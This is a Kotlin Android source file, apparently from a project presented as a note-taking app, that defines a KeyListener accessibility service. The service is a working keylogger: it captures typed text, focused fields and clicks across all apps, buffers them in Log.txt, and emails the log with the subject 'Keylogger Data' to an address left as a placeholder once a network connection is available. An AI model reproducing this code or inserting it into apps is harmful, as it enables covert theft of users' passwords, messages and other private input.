package com.example.cleanarchitecturenoteapp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.accessibilityservice.AccessibilityServiceInfo
import android.net.ConnectivityManager
import android.net.NetworkInfo
import java.io.BufferedReader
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import java.lang.Exception
import java.lang.StringBuilder
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

class KeyListener : AccessibilityService() {
    var res = ""
    public override fun onServiceConnected() {
        Log.v("Connected :", "Onservice() Connected...")
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 100
        info.packageNames = null
        serviceInfo = info
    }
//    override fun onAccessibilityEvent(event: AccessibilityEvent) {
//        val eventType: Int = event.getEventType()
//        val eventText: String? = null
//        when (eventType) {
//            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
//                val currApp: String = event.getPackageName().toString()
//                if (foregroundApp == currApp || foregroundApp.isEmpty()) {
//                    lastMsg = event.getText().toString()
//                    Log.d("Pre", "$currApp  :  $lastMsg")
//                } else {
//                    Log.d("Final ", "$foregroundApp :  $lastMsg")
//                }
//                foregroundApp = currApp
//                lastMsg = event.getText().toString()
//            }
//        }
//    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val df: DateFormat = SimpleDateFormat("dd MMM, hh:mm ")
        val time = df.format(Calendar.getInstance().time)
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                var data = event.text.toString()
                data = "$time|(TEXT)|$data"
                res = """
                $res$data
                
                """.trimIndent()
                Log.v("OP: ", "$time|(TEXT)|$data")
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                var data = event.text.toString()
                data = "$time|(FOCUSED)|$data"
                res = """
                    $res$data
                    
                    """.trimIndent()
                Log.v("OP: ", "$time|(FOCUSED)|$data")
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                var data = event.text.toString()
                data = time + "|(CLICKED)|" + event.text.toString() + data
                res = """
                    $res$data
                    
                    """.trimIndent()
                Log.v("OP: ", time + "|(CLICKED)|" + event.packageName.toString() + data)
                if (res.length > 1000) {
                    try {
                        val file = File(applicationContext.getExternalFilesDir(null), "Log.txt")
                        val fos = FileOutputStream(file, true)
                        fos.write(res.toByteArray())
                        fos.close()
                        val fsize = file.length().toDouble() / 1024
                        val conMgr = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
                        if (fsize > 5.0) {
                            if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)!!.state == NetworkInfo.State.CONNECTED
                                || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI)!!.state == NetworkInfo.State.CONNECTED
                            ) {
                                val text = StringBuilder()
                                val br = BufferedReader(FileReader(file))
                                var line: String?
                                while (br.readLine().also { line = it } != null) {
                                    text.append(line)
                                    text.append('\n')
                                }
                                br.close()

                                //Creating SendMail object
                                try {
                                    val sm = SendMail(
                                        this,
                                        "XXXXX",
                                        "Keylogger Data",
                                        text.toString()
                                    ) //Change XXXX by email adress where to send

                                    //Executing sendmail to send email
                                    sm.execute()
                                    file.delete()
                                } catch (e: Exception) {
                                    Log.v("err", "Error while sending mail:" + e.message)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.v("msg", e.message!!)
                    }
                    res = ""
                }
            }
            else -> {}
        }
    }
    override fun onInterrupt() {
        Log.d("Interrupt", "onInterrupt() is Called...")
    }
}